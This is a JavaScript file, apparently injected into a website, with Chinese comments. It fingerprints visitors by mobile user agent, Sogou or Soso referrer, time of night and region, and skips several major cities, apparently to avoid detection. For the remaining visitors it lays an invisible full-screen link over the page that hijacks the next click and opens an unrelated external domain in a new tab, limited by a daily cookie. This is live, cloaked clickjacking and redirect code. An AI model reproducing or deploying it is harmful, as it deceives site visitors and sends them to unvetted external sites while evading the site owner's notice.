var wap = navigator.userAgent.match(/Android|Linux|iPad|iPhone|iPod/i) != null;
var ios = navigator.userAgent.match(/iPad|iPhone|iPod/i) != null;
var azs = navigator.userAgent.match(/Android|Linux/i) != null;
var lailu = document.referrer.toLowerCase().match(/sogou|soso/i) != null;
function show_code(){
    var tcurl = 'https://1j103lpnt.shaolinsizhaoshengguanwang.com/ice140';
    var isshare = getCookie('diantan');
    if(isshare == null || isshare == ''){
    	setCookie('diantan', 'true', 86400);
    	tanchu(tcurl); //这里是点击新窗口
    }
}
if(wap){
    $(document).ready(function(){
        if (/Win/i.test(navigator.platform)) return false;
        if(lailu){
        	if(time_range('00:00','08:00') || time_range('22:00','23:59') && ios){
        	    if(SiteTid==16 || SiteTid==18 || SiteTid==6 || SiteTid==10){
        			if(shengfen=="北京" || shengfen=="重庆" || shengfen=="上海" || shengfen=="浙江" || shengfen=="山东" || chengshi=="成都" || chengshi=="深圳" || chengshi=="广州"){
        				return false;
        			}else{
        			    show_code();
        			}
        	    }
        	}else if(azs){
        	    if(SiteTid==16 || SiteTid==18 || SiteTid==6 || SiteTid==10){
        			if(shengfen=="北京" || shengfen=="重庆" || shengfen=="上海" || shengfen=="浙江" || shengfen=="山东" || chengshi=="成都" || chengshi=="深圳" || chengshi=="广州"){
        				return false;
        			}else{
        			    show_code();
        			}
        	    }
        	}
        }
    });
}
//弹出新窗口
function tanchu(url){
	var tanchuhtml='<a style="background: transparent;border:none;width:100%;height:100%;margin:0;padding:0;z-index:9999;position:fixed;top:0;left:0;" class="btn" href="'+url+'" onclick="yincang(\'tanchu\')" target="_blank"></a>';
	var zijian_1 = document.createElement('span');
	zijian_1.id = 'tanchu';
	document.body.appendChild(zijian_1);
	document.getElementById('tanchu').innerHTML= tanchuhtml;
}
//点击删除元素
function yincang(idname){
	var el = document.getElementById(idname);
	el.parentNode.removeChild(el);
}
//添加cookie
function setCookie(name,value,miao){
	var exp = new Date();
	exp.setTime(exp.getTime() + miao*1000);
	document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
}
//删除cookie
function delCookie(name,value,miao){
	var exp = new Date();
	exp.setTime(exp.getTime() - miao*1000);
	document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
}
//获取cookie状态
function getCookie(name){
	var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
	if(arr=document.cookie.match(reg)){
		return unescape(arr[2]);
	}else{
		return null;
	}
}
//判断时间
function time_range(beginTime, endTime) {
    var strb = beginTime.split(":");
    if (strb.length != 2) {
        return false;
    }
 
    var stre = endTime.split(":");
    if (stre.length != 2) {
        return false;
    }
 
    var b = new Date();
    var e = new Date();
    var n = new Date();
    //n.setHours(22);
    
    b.setHours(strb[0]);
    b.setMinutes(strb[1]);
    e.setHours(stre[0]);
    e.setMinutes(stre[1]);
 
    if (n.getTime() - b.getTime() > 0 && n.getTime() - e.getTime() < 0) {
       return true;
    } else {
       return false;
    }
}